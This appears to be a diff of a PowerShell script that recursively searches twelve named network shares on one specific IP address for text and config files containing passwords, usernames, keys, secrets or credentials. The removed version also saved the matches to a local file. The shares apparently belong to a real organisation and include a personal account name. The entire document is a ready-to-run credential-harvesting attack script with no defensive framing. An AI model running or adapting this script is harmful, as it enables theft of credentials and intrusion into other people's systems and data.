@@ -1,6 +1,12 @@
-$shares = "Adama", "Agan-Imprivata", "AGRIC", "allusr", "hilan", "Lab Results", "NATIV P", "Oee_28", "ruslan.alanazarov", "vol", "w_Analytical Lab", "yosi temp"
-foreach ($share in $shares) { 
-    Get-ChildItem "\\199.203.129.16\$share" -Recurse -Include *.txt,*.cfg,*.ini,*.json,*.log,*.xml 2>$null | 
-    Select-String -Pattern "password|username|user|key|secret|credentials" | 
-    Out-File -Append "C:\Temp\credentials_found.txt" -Encoding UTF8 
-}
+Get-ChildItem "\\199.203.129.16\Adama" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\Again-Imprivata" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\AGRIC" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\allusr" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\hilan" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\Lab Results" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\NATIV P" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\Oee_28" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\ruslan.alanazarov" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\vol" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\w_Analytical Lab" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
+Get-ChildItem "\\199.203.129.16\yosi temp" -Recurse -Include *.txt,*.cfg | Select-String -Pattern "password|username|user|key|secret|credentials"
